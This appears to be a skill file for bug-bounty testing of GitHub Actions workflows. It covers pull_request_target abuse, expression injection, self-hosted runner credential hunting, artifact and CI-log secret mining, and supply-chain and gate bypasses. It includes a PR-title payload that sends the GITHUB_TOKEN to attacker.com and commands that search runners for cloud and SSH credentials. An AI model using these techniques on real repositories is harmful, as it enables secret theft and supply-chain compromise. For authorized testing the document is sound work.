---
name: github-actions
description: GitHub Actions attack surface: pull_request_target exploits, GITHUB_TOKEN scope abuse, workflow_run injection, self-hosted runner escape, expression injection, artifact secret leakage
depends_on: []
---

# GitHub Actions

GitHub Actions is the highest-paying CI/CD attack surface in bug bounty. Corpus max $1.3M. The core pattern: any workflow that combines attacker-controlled input (PR title, branch name, issue body) with privileged execution context (write permissions, secrets, self-hosted runners) is exploitable.

## pull_request_target Exploitation

`pull_request_target` runs in the context of the BASE branch (has secrets, write access) but can be triggered by a fork PR. This is the canonical GitHub Actions vulnerability ($750K+ combined corpus payouts).

```bash
# Step 1: Find vulnerable workflows
git clone --depth 1 https://github.com/target/repo
grep -rn "pull_request_target" .github/workflows/

# Step 2: For each workflow with pull_request_target, trace:
# a) Does it checkout the PR HEAD? (actions/checkout with ref: github.event.pull_request.head.sha)
# b) Does it run any code from the PR? (npm install, pip install, make, scripts from PR)
# c) Does it use PR-controlled data in run: blocks?
```

The attack: fork the repo, modify a workflow script or dependency, create a PR. If the target workflow checks out the PR HEAD and runs any code from it, the attacker's code executes with the base repo's secrets.

```yaml
# VULNERABLE PATTERN:
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # checks out attacker's code
      - run: npm install  # executes attacker's package.json scripts
```

## Expression Injection in Shell Contexts

Untrusted data injected into `run:` blocks via `${{ }}` expressions:

```bash
# Find expression injection in all workflows
grep -rn '\${{ github\.event\.' .github/workflows/ | grep "run:"

# High-risk expressions (attacker-controlled):
# ${{ github.event.pull_request.title }}
# ${{ github.event.pull_request.body }}
# ${{ github.event.pull_request.head.ref }}  (branch name)
# ${{ github.event.issue.title }}
# ${{ github.event.issue.body }}
# ${{ github.event.comment.body }}
# ${{ github.event.discussion.title }}
# ${{ github.event.discussion.body }}
# ${{ github.event.pages.*.page_name }}
# ${{ github.head_ref }}
```

The attack: set a PR title or branch name to a shell injection payload:

```bash
# PR title injection example
# PR title: "test"; curl http://attacker.com/$(cat $GITHUB_TOKEN) #
# If workflow has: run: echo "Processing PR: ${{ github.event.pull_request.title }}"
# It becomes: run: echo "Processing PR: test"; curl http://attacker.com/$(cat $GITHUB_TOKEN) #"
```

Safe pattern: use environment variables instead of inline expressions:

```yaml
# SAFE: expression in env, not in run:
env:
  PR_TITLE: ${{ github.event.pull_request.title }}
run: echo "Processing PR: $PR_TITLE"
```

## Self-Hosted Runner Exploitation

Self-hosted runners persist between jobs. If an attacker can trigger a workflow on a self-hosted runner, they get code execution on the host machine. $1.3M combined corpus payouts.

```bash
# Step 1: Find repos with self-hosted runners
grep -rn "runs-on: self-hosted\|runs-on:.*self-hosted" .github/workflows/

# Step 2: Check if the workflow can be triggered by a fork PR
# pull_request from forks run on self-hosted only if explicitly allowed

# Step 3: Check for leftover credentials from previous runs
# Self-hosted runners may have: AWS creds, SSH keys, Docker config, kubeconfig
ls ~/.aws/ ~/.ssh/ ~/.docker/ ~/.kube/ 2>/dev/null
env | grep -iE "token|key|secret|password|credential"

# Step 4: Check for persistent access
# Can you write to the runner's filesystem? Install a backdoor?
# Does the runner auto-register with fresh credentials each run?
```

## GITHUB_TOKEN Scope Abuse

Every workflow gets a `GITHUB_TOKEN` with permissions defined in the workflow YAML. Over-scoped tokens enable lateral movement:

```bash
# Check token permissions in workflow
grep -A 20 "permissions:" .github/workflows/*.yml

# Default permissions (if not explicitly set) are often too broad:
# contents: write, packages: write, issues: write, pull-requests: write

# If GITHUB_TOKEN has contents:write, attacker can:
# - Push to the repo (modify code, add workflows)
# - Create/delete branches
# - Modify releases

# If GITHUB_TOKEN has packages:write:
# - Publish malicious packages to GitHub Packages
```

## workflow_run Injection

`workflow_run` triggers when another workflow completes. It runs in the base branch context with full secrets, even if triggered by a fork PR's workflow.

```yaml
# VULNERABLE: workflow_run triggered by fork PR workflow
on:
  workflow_run:
    workflows: ["Build"]
    types: [completed]
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      # If this uses artifacts from the triggering workflow,
      # attacker controls those artifacts via their fork PR
```

The attack: attacker's fork PR triggers "Build" workflow -> "Build" uploads artifacts -> `workflow_run` downloads and processes attacker-controlled artifacts with base repo secrets.

## Artifact Secret Scanning

CI/CD artifacts may contain secrets left over from the build process:

```bash
# Download workflow artifacts via API
gh api repos/target/repo/actions/artifacts --paginate | jq '.artifacts[] | {name, id, created_at}'

# Download specific artifact
gh api repos/target/repo/actions/artifacts/{id}/zip > artifact.zip
unzip artifact.zip -d artifact_contents/

# Search for secrets in artifacts
grep -rn "AKIA\|ghp_\|gho_\|github_pat\|sk-\|password\|secret\|token" artifact_contents/
```

## Action Supply Chain

Third-party actions referenced via `uses:` can be compromised:

```bash
# Find all action references
grep -rn "uses:" .github/workflows/ | grep -v "actions/"  # non-GitHub-official actions

# For each third-party action:
# 1. Is it pinned to a SHA? (safe) or a tag/branch? (mutable)
# uses: owner/action@v1       # TAG - can be force-pushed
# uses: owner/action@main     # BRANCH - constantly changing
# uses: owner/action@abc123f  # SHA - immutable (safe)

# 2. Check if the action's repo is archived, transferred, or the owner account is available
# A deleted/transferred repo name can be re-registered by an attacker
```

## Gate Bypass

When security controls depend on labels, status checks, or automation state:

```bash
# Find workflows that check labels or statuses
grep -rn "github.event.label\|github.event.review\|github.event.check" .github/workflows/

# Attack: if a label like "safe-to-test" gates privileged execution,
# can you trigger the label assignment? (e.g., via a comment bot that
# responds to keywords, or by being added as a collaborator)
```

The pattern: audit the gate mechanism, not just the existence of a gate. If a security control depends on a label assigned by automation, compromising the automation (or its trigger conditions) bypasses the gate. $10K corpus pattern.

## CI Log Credential Mining

Public CI/CD logs often leak secrets:

```bash
# GitHub Actions logs are accessible via API
gh api repos/target/repo/actions/runs --paginate | jq '.workflow_runs[] | {id, name, created_at}'
gh api repos/target/repo/actions/runs/{id}/logs > logs.zip
unzip logs.zip -d logs/

# Search for secrets in logs
grep -rn "password\|token\|secret\|api_key\|AKIA\|ghp_\|Bearer" logs/
# Also: base64-encoded secrets, URLs with embedded credentials
grep -rn "https://[^:]*:[^@]*@" logs/
```

## Dependabot / Renovate Confusion

Automated dependency update bots create PRs that run workflows. If the bot's PRs are trusted differently than fork PRs:

1. **Actor confusion**: some workflows check `github.actor` to decide trust level. Dependabot's actor is `dependabot[bot]` -- can you spoof this?
2. **Label-based trust**: bot PRs get auto-labeled `dependencies` -- can you create a PR with the same label?
3. **Bot token scope**: Dependabot has its own secrets (`DEPENDABOT_TOKEN`) that may have broader access than `GITHUB_TOKEN`

## Probe Targets

```bash
# Clone and audit all workflow files
git clone --depth 1 https://github.com/target/repo
find .github/workflows/ -name "*.yml" -o -name "*.yaml" | while read f; do
  echo "=== $f ==="
  
  # Check for pull_request_target
  grep -n "pull_request_target" "$f"
  
  # Check for expression injection
  grep -n '\${{ github\.event\.' "$f" | grep "run:"
  
  # Check for self-hosted runners
  grep -n "self-hosted" "$f"
  
  # Check for workflow_run
  grep -n "workflow_run" "$f"
  
  # Check for unpinned actions
  grep -n "uses:" "$f" | grep -v "@[a-f0-9]\{40\}"
  
  # Check for overly broad permissions
  grep -n "permissions:" "$f"
done

# Check public artifacts
gh api repos/target/repo/actions/artifacts 2>/dev/null | jq '.total_count'

# Check public workflow run logs
gh api repos/target/repo/actions/runs?per_page=5 2>/dev/null | jq '.workflow_runs[].html_url'
```

## Defense-Bypass Pairs

| Defense | Bypass | Evidence |
|---------|--------|----------|
| `pull_request` event (not `pull_request_target`) | `workflow_run` triggered by the PR's workflow runs with base secrets | Indirect privilege escalation |
| Expression injection blocked in `run:` | Expression used in `actions/github-script` or custom action inputs | Different injection context |
| Third-party actions pinned to SHA | Action repo transferred/deleted and re-registered by attacker | Supply chain via repo takeover |
| Self-hosted runner cleanup between jobs | Persistent filesystem, Docker cache, or credentials in home directory | Incomplete cleanup |
| GITHUB_TOKEN scoped to `read` | Artifact upload/download has separate permissions; secrets in artifacts | Token scope != artifact scope |
| Fork PRs blocked from self-hosted runners | Dependabot PRs or bot-created PRs may be treated as "internal" | Bot trust confusion |
| Label-gated privileged workflow | Attacker triggers label bot via issue comment keyword | Gate mechanism bypass |

## Chain Patterns

| Base Finding | Chain With | Combined Impact |
|-------------|-----------|----------------|
| Expression injection in `run:` | GITHUB_TOKEN with contents:write | Push malicious code to repo |
| pull_request_target + checkout PR HEAD | Secrets in workflow environment | Exfiltrate all repo secrets |
| Self-hosted runner access | Leftover cloud credentials on runner | Cloud account compromise |
| Artifact secret leakage | Valid API keys in artifacts | Direct access to target infrastructure |
| workflow_run + attacker artifacts | Deploy workflow processes artifacts | Malicious deployment via supply chain |

## Cross-References

`supply_chain`, `ci_cd_security`, `command_injection`, `information_disclosure`, `ssrf`

## Validation Requirements

- For expression injection: demonstrate command execution via crafted PR title/body/branch name
- For pull_request_target: show that fork PR code executes with base repo secrets (without actually exfiltrating real secrets -- demonstrate the path, not the theft)
- For self-hosted runner: demonstrate persistent access or credential extraction from runner environment
- For artifact secrets: show the extracted credential exists in a downloadable artifact
- For action supply chain: demonstrate that a mutable reference (tag/branch) can be replaced
- Report the MECHANISM and IMPACT without actually exfiltrating production secrets
